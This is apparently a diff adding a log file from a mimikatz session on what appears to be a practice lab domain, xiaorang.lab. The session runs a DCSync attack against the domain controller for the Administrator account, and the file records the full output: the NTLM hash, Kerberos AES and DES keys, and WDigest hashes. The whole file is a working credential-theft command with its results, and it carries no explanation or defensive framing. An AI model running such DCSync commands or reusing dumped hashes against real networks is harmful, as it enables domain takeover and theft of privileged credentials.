@@ -1,0 +1,81 @@
+Using '1.txt' for logfile : OK
+
+mimikatz # lsadump::dcsync /domain:xiaorang.lab /user:administrator
+[DC] 'xiaorang.lab' will be the domain
+[DC] 'DC-PROGAME.xiaorang.lab' will be the DC server
+[DC] 'administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   : 1601/1/1 8:00:00
+Password last change : 2026/3/26 18:59:51
+Object Security ID   : S-1-5-21-3623938633-4064111800-2925858365-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 04d93ffd6f5f6e4490e0de23f240a5e9
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6d786900cfad7010f2460f58d21cc067
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : XIAORANG.LABAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a7c1e1940765d04f18ac3a43d09588e96af827808f921e5855730a2a050ef007
+      aes128_hmac       (4096) : 3c7453f1f392a7f8c1af77696a160f2d
+      des_cbc_md5       (4096) : a8e0b35eefe9d3d0
+    OldCredentials
+      aes256_hmac       (4096) : a7c1e1940765d04f18ac3a43d09588e96af827808f921e5855730a2a050ef007
+      aes128_hmac       (4096) : 3c7453f1f392a7f8c1af77696a160f2d
+      des_cbc_md5       (4096) : a8e0b35eefe9d3d0
+
+* Primary:Kerberos *
+    Default Salt : XIAORANG.LABAdministrator
+    Credentials
+      des_cbc_md5       : a8e0b35eefe9d3d0
+    OldCredentials
+      des_cbc_md5       : a8e0b35eefe9d3d0
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  0f7990fa51442d1fc1b9f5703b7a9f53
+    02  f8f3ab7a545c3df42068692e22e5fd1a
+    03  63b49f8e791de04010e0d3838864fb5d
+    04  0f7990fa51442d1fc1b9f5703b7a9f53
+    05  7c94fce5f59a52edc7c941683f529315
+    06  db3d41291d2865f07788fcd0878e9048
+    07  8cffc17d1ac652e058047f177988f94f
+    08  e0204b55258553e92222b39548b6bf64
+    09  c024e8558b548d9ed0dac80cb3937227
+    10  a55582f6895260bfb4c18eccc5e43639
+    11  23cd59de8b7fc224a076a0f3001afbfa
+    12  e0204b55258553e92222b39548b6bf64
+    13  b4716b4fe3233db5dd79d97fe470a11b
+    14  b6b21073a6bd20a1ef665cbdf3633bc9
+    15  472854e67b07839a52b40ddeec245582
+    16  d47433701f75461a006ab9a73a7ba33b
+    17  7655b2aeae13a52426da7558382f1e98
+    18  3c384e9401eb1d0467ee29affd959e98
+    19  a68e52c5f665ac7f178061a140670af0
+    20  51a1204a8e37e806fdfb16f0c2ffd7cb
+    21  014900de757e1f20310d8c0d1fb1d812
+    22  3f683ca0caafbd5e4dee3b919901066d
+    23  b12255387f518480c552971cbab71ac1
+    24  6c1b44f40c541a959d45423231dccef4
+    25  c18dd5d14b73706c6abc66233f42ada8
+    26  11a8ab9dc7e507ee0d99d3295f7c9e06
+    27  d5ab194a6f297a6565e230ce525f0539
+    28  3b50d0aa5201e3e934bccbe200010ddb
+    29  97bafc631fb4dfe596c1a2c5e0ad19e5
+
+
+mimikatz # 
